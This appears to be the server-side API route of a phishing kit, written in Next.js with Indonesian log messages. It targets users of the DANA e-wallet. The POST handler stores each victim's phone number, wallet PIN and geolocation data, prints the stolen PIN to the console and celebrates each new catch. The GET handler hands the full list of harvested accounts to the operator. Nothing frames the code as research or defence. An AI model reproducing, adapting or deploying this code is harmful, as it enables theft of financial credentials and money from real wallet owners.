import ConDB from '@/lib/conDB'
import Dana from '@/models/models'
import { NextResponse } from 'next/server'

ConDB()

type UserInfoItem = {
  key: string;
  value: string;
}

export const POST = async(req: any) => {
    const data = await req.formData()
    const auth = req.headers.get('Authorization')

    if(auth !== process.env.NEXT_PUBLIC_AUTH) {
      console.log(`[!] ${data.get('ip_address')} mencoba membobol`)
      return NextResponse.json({ message: 'Not found'  }, { status: 404 })
    }

   try {
     const nomor_dana = data.get('nomor')
     const pin_dana = data.get('pin_dana')
     const uInfo = data.get('user_info')
     const parsedUserInfo: UserInfoItem[] = uInfo ? JSON.parse(uInfo) : [];

     console.log(`${nomor_dana}\n${pin_dana}\n${uInfo}\n${parsedUserInfo}`)
     
     const user_info = {
       ip_address: parsedUserInfo.find(item => item.key === 'Ip Adress')?.value || '',
       city: parsedUserInfo.find(item => item.key === 'Kota')?.value || '',
       country: parsedUserInfo.find(item => item.key === 'Negara')?.value || '',
       loc: parsedUserInfo.find(item => item.key === 'Kode lokasi')?.value || '',
       hostname: parsedUserInfo.find(item => item.key === 'hostname')?.value || '',
       org: parsedUserInfo.find(item => item.key === 'org')?.value || '',
       timezone: parsedUserInfo.find(item => item.key === 'Zona waktu')?.value || ''
     }

     await Dana.create({nomor_dana, pin_dana, user_info})
     console.log("\x1b[32m\x1b[1m[✓] Ada user baru cuii!\x1b[0m")
     
     return NextResponse.json({ message: 'User berhasil dibuat'}, { status: 201 })
   } catch(err) {
     console.log(`[X] Error saat POST user baru ke database: ${err}\n`)
     return NextResponse.json({ message: 'Internal Server Error'}, { status: 500 })
   }
}

export const GET = async(req: any) => {
  const auth = req.headers.get('Authorization')

   if(auth !== process.env.NEXT_PUBLIC_AUTH) {
      console.log("[!] Seseorang mencoba membobol")
      return NextResponse.json({ message: 'Not found'}, { status: 404 })
   }

   try {
      const DanaList = await Dana.find()
      console.log('[✓] Berhasil mengirim list akun')
      return NextResponse.json({ DanaList }, { status: 200 })
   } catch(err) {
      return NextResponse.json({ message: 'Akun not found' }, { status: 404 })
   }
}
